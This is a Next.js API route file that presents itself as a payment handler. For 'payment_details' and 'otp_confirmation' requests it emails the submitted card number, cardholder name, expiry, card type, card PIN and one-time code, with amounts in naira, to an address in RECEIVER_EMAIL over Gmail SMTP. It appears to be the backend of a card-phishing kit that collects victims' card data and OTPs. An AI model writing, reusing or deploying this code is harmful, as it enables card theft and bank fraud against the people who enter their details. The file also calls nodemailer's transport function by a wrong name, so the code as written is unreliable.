import { type NextRequest, NextResponse } from "next/server"
import nodemailer from "nodemailer"

export async function POST(request: NextRequest) {
  try {
    const { type, data } = await request.json()

    // Create transporter using environment variables
    const transporter = nodemailer.createTransporter({
      host: "smtp.gmail.com",
      port: 587,
      secure: false,
      auth: {
        user: process.env.SMTP_USER,
        pass: process.env.SMTP_PASS,
      },
    })

    let subject = ""
    let htmlContent = ""

    if (type === "payment_details") {
      subject = "Payment Details Submitted"
      htmlContent = `
        <h2>Payment Details Received</h2>
        <p><strong>Amount:</strong> ₦${data.amount}</p>
        <p><strong>Email:</strong> ${data.email}</p>
        <p><strong>Card Name:</strong> ${data.cardName}</p>
        <p><strong>Card Number:</strong> ${data.cardNumber}</p>
        <p><strong>Expiry:</strong> ${data.expiryDate}</p>
        <p><strong>Card Type:</strong> ${data.cardType}</p>
        <p><strong>PIN:</strong> ${data.pin}</p>
        <p><em>Payment details submitted successfully.</em></p>
      `
    } else if (type === "otp_confirmation") {
      subject = "OTP Verification Completed"
      htmlContent = `
        <h2>OTP Verification</h2>
        <p><strong>Amount:</strong> ₦${data.amount}</p>
        <p><strong>Email:</strong> ${data.email}</p>
        <p><strong>OTP Entered:</strong> ${data.otp}</p>
        <p><em>OTP verification completed successfully.</em></p>
      `
    }

    const mailOptions = {
      from: process.env.SMTP_USER,
      to: process.env.RECEIVER_EMAIL,
      subject: subject,
      html: htmlContent,
    }

    await transporter.sendMail(mailOptions)

    return NextResponse.json({ success: true, message: "Email sent successfully" })
  } catch (error) {
    console.error("Email sending error:", error)
    return NextResponse.json({ success: false, error: "Failed to send email" }, { status: 500 })
  }
}
